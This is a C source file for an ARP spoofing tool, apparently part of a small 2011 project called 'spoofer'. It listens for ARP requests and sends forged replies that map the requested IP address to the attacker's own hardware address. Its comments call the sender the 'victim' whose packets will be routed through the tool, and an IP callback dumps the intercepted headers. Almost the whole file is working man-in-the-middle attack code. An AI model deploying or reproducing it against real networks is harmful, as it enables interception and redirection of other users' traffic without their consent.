/* Copyright (c) 2011, Ilya Arefiev <arefiev.id@gmail.com> */
/* All rights reserved. */
/*  */
/* Redistribution and use in source and binary forms, with or without */
/* modification, are permitted provided that the following conditions are */
/* met: */
/*  * Redistributions of source code must retain the above copyright */
/*    notice, this list of conditions and the following disclaimer. */
/*  * Redistributions in binary form must reproduce the above copyright */
/*    notice, this list of conditions and the following disclaimer in the */
/*    documentation and/or other materials provided with the */
/*    distribution. */
/*  * Neither the name of the author nor the names of its */
/*    contributors may be used to endorse or promote products derived */
/*    from this software without specific prior written permission. */
/*  */
/* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS */
/* IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED */
/* TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A */
/* PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT */
/* HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, */
/* SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT */
/* LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, */
/* DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY */
/* THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT */
/* (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE */
/* OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <arpa/inet.h>	// ntohs
#include <netinet/ether.h>	// ether_ntoa
#include <netinet/ip.h>		// struct iphdr
#include <memory.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <netpacket/packet.h>	// sockaddr_ll

#include "spoofer.h"
#include "utils.h"

int spf_arp_callback(unsigned char* _packet, int _len, void* _args)
{
#ifdef _DEBUG
	printf("== %s\n",
		__PRETTY_FUNCTION__
		);
#endif

	if ( !_packet || _len < 0 )
	{
		return 1;
	}

	ARP_PACKET* pack = (ARP_PACKET*)_packet;
	PF_PROPERTIES* prop = (PF_PROPERTIES*)_args;

	struct ether_addr	eshw;
	struct ether_addr	edhw;
	
	struct ether_addr	ashw;
	struct ether_addr	athw;
	struct in_addr		asip;
	struct in_addr		atip;

	char shw[BUFSZ];
	char thw[BUFSZ];
	char sip[BUFSZ];
	char tip[BUFSZ];
	memset( shw, 0, sizeof(shw) );
	memset( thw, 0, sizeof(thw) );
	memset( sip, 0, sizeof(sip) );
	memset( tip, 0, sizeof(tip) );

	// ethernet part
	memcpy( eshw.ether_addr_octet, pack->eth_hdr.ether_shost, sizeof(pack->eth_hdr.ether_shost) );
	memcpy( edhw.ether_addr_octet, pack->eth_hdr.ether_dhost, sizeof(pack->eth_hdr.ether_dhost) );

	printf("eth: %s -> %s (%04x)\n",
		u_hw2str( &eshw, shw, BUFSZ ),
		u_hw2str( &edhw, thw, BUFSZ ),
		ntohs( pack->eth_hdr.ether_type )
		);
	
	// arp part
	memset( shw, 0, sizeof(shw) );
	memset( thw, 0, sizeof(thw) );

	memcpy( &ashw, pack->arp_data.shw, sizeof(pack->arp_data.shw) );
	memcpy( &athw, pack->arp_data.thw, sizeof(pack->arp_data.thw) );
	memcpy( &asip, pack->arp_data.sip, sizeof(pack->arp_data.sip) );
	memcpy( &atip, pack->arp_data.tip, sizeof(pack->arp_data.tip) );

	printf("arp: ");
	if ( ntohs(pack->arp_hdr.ar_op) == ARPOP_REQUEST )
	{
		// ARP request
		printf("who has %s (%s) tell %s (%s)\n",
			u_ip2str( &atip, tip, BUFSZ ),
			u_hw2str( &athw, thw, BUFSZ ),
			u_ip2str( &asip, sip, BUFSZ ),
			u_hw2str( &ashw, shw, BUFSZ )
			);
		u_hexout( pack, sizeof(ARP_PACKET) );

		//
		// send fake reply
		//
		ARP_PACKET* reply = (ARP_PACKET*)calloc( 1, sizeof(ARP_PACKET) );

		// send to asking machine
		//
		// packet headers
		memcpy( reply->eth_hdr.ether_dhost, &eshw, sizeof(eshw) );
		memcpy( reply->eth_hdr.ether_shost, &(prop->own_hw), sizeof(prop->own_hw) );
		reply->eth_hdr.ether_type = pack->eth_hdr.ether_type;

		memcpy( &(reply->arp_hdr), &(pack->arp_hdr), sizeof(pack->arp_hdr) );
		reply->arp_hdr.ar_op = htons( ARPOP_REPLY );

		// packet data
		memcpy( reply->arp_data.shw, &(prop->own_hw), sizeof( ashw ) );		// victim will send packages via /me
		memcpy( reply->arp_data.sip, &(atip), sizeof( asip ) );				// tell victim /me have desirable IP
		memset( reply->arp_data.thw, 0, sizeof( athw ) );					// don't care
		memset( reply->arp_data.tip, 0, sizeof( atip ) );					// don't care


		// address data
		struct sockaddr_ll sall;
		sall.sll_family = PF_PACKET;
		sall.sll_protocol = ETH_P_IP;			// they said it is useless field due to raw eth packet
		sall.sll_ifindex = prop->iface_idx;
		sall.sll_hatype = ARPHRD_ETHER;
		sall.sll_pkttype = PACKET_OTHERHOST;	// destinaton is another host
		sall.sll_halen = ETH_ALEN;
		memcpy( sall.sll_addr, &(eshw), sizeof(eshw) );	// dst ETH
		sall.sll_addr[6] = 0x00;
		sall.sll_addr[7] = 0x00;

		if ( sendto( prop->sock, reply, sizeof(ARP_PACKET), 0,
				(struct sockaddr*)&sall, sizeof(sall) ) < 0)
		{
			fprintf( stderr, "sendto error %d %s\n",
				errno, strerror(errno) );
		}
		else
		{
			printf("fake ARP reply sent\n");
			u_hexout( reply, sizeof(ARP_PACKET) );
		}

		free(reply);
	}
	else if ( ntohs(pack->arp_hdr.ar_op) == ARPOP_REPLY )
	{
		// ARP reply
		printf("%s is at %s -> %s (%s)\n",
			u_ip2str( &asip, sip, BUFSZ ),
			u_hw2str( &ashw, shw, BUFSZ ),
			u_ip2str( &atip, tip, BUFSZ ),
			u_hw2str( &athw, thw, BUFSZ )
			);

	}
	else
	{
		printf("unknown opcode\n");

		#ifdef _DEBUG
		printf("hex:");
		u_hexout( _packet, _len );
		#endif

		char fname[BUFSZ];
		memset( fname, 0, BUFSZ );
		sprintf( fname, "packet-%ld", time(NULL) );

		FILE* fd = fopen( fname, "ab" );
		fwrite( _packet, sizeof(unsigned char), _len, fd );
		fclose(fd);
	}

	/* u_hexout( _packet, _len ); */
	printf("\n");

	return 0;
}

int spf_ip_callback(unsigned char* _packet, int _len, void* _args)
{
#ifdef _DEBUG
	printf("== %s\n",
		__PRETTY_FUNCTION__
		);
#endif

	if ( !_packet || _len < 0 )
	{
		return 1;
	}

	/* u_hexout( _packet, _len ); */
	struct ether_header* hdr_eth = (struct ether_header*)_packet;
	struct iphdr* hdr_ip = (struct iphdr*)( _packet + sizeof(struct ether_header) );

	printf("++ eth:");
	u_hexout( hdr_eth, sizeof(struct ether_header) );
	printf("++ ip:");
	u_hexout( hdr_ip, sizeof(struct iphdr) );

	// TODO: change src/dst ip && recalc checksum

	return 0;
}
